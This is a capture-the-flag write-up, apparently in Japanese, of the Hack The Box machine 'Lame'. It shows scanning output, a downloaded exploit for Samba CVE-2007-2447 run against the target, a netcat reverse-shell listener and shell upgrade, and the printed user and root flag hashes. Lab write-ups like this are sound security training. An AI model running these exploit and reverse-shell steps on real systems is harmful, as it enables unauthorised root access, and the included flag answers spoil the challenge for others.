https://app.hackthebox.com/machines/Lame
## STEP 1
```sh
└─$ rustscan -a 10.129.2.250 --no-banner --scripts none
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.129.2.250:21
Open 10.129.2.250:22
Open 10.129.2.250:139
Open 10.129.2.250:445
Open 10.129.2.250:3632
10.129.2.250 -> [21,22,139,445,3632]
```
```sh
└─$ nmap -n -Pn -p445 -sV -sC  10.129.2.250
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-03 07:40 EDT
Nmap scan report for 10.129.2.250
Host is up (1.2s latency).

PORT    STATE SERVICE     VERSION
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)

Host script results:
|_clock-skew: mean: 2h00m31s, deviation: 2h49m45s, median: 29s
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2025-06-03T07:41:31-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 49.14 seconds
```

## STEP 2
smbd 3.0.20には、CVE-2007-2447が存在する  
[PoC](https://github.com/amriunix/CVE-2007-2447)でエクスプロイト
```sh
└─$ wget -nv https://raw.githubusercontent.com/amriunix/CVE-2007-2447/refs/heads/master/usermap_script.py
2025-05-01 02:02:38 URL:https://raw.githubusercontent.com/amriunix/CVE-2007-2447/refs/heads/master/usermap_script.py [1027/1027] -> "usermap_script.py" [1]

└─$ uv init -p 3.13
Initialized project `uv`

└─$ uv add pysmb
Resolved 5 packages in 2.01s
      Built pysmb==1.2.11
Prepared 3 packages in 401ms
Installed 3 packages in 1ms
 + pyasn1==0.6.1
 + pysmb==1.2.11
 + tqdm==4.67.1

└─$ uv run usermap_script.py
[*] CVE-2007-2447 - Samba usermap script
[-] usage: python usermap_script.py <RHOST> <RPORT> <LHOST> <LPORT>

└─$ uv run usermap_script.py 10.129.2.250 445 10.10.14.70 4444
[*] CVE-2007-2447 - Samba usermap script
[+] Connecting !
[+] Payload was sent - check netcat !
```
リバースシェル取得！  
ユーザ・ルートフラグゲット
```sh
└─$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.14.70] from (UNKNOWN) [10.129.2.250] 54267

python -c 'import pty; pty.spawn("/bin/bash")'

root@lame:/# ^Z
zsh: suspended  nc -lnvp 4444

└─$ stty raw -echo; fg
[1]  + continued  nc -lnvp 4444

root@lame:/# export SHELL=bash

root@lame:/# export TERM=xterm-256color

root@lame:/# stty rows 66 columns 236

root@lame:/# id
uid=0(root) gid=0(root)

root@lame:/# cat /home/makis/user.txt
8dde98b63ee3ce3abfc669693d292cf1

root@lame:/# cat /root/root.txt
bebad012414c4bda78d9bc4a1e43f977
```
